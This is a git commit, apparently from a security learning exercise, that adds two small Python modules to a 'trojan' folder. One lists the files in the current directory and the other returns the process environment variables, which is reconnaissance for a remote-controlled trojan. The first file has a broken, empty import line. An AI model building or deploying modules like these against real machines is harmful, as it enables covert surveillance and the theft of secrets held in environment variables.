3fcd3ea0efba7fe7af8e20c2a74b187989e2dd90
jthemee <jthemee@gmail.com>
2015-07-15 16:09:51 +0200

    new script trojan

---
+++ trojan/dirlistener.py
@@ -0,0 +1,14 @@
+##
+# script for new module trojan in Python
+#@autor Jerome Themee - security analyst
+#@ 15/07/2015
+##
+import 
+
+def run(**args):
+	
+	print "[*] Dir listener module]."
+	files = os.listdir(".")
+
+	return str(files)
+
---
+++ trojan/environment.py
@@ -0,0 +1,11 @@
+##
+# script for new module trojan in Python
+#@autor Jerome Themee - security analyst
+#@ 15/07/2015
+##
+import os
+
+def run(**args):
+
+	print "[*] Environment module."
+	return str(os.environ)
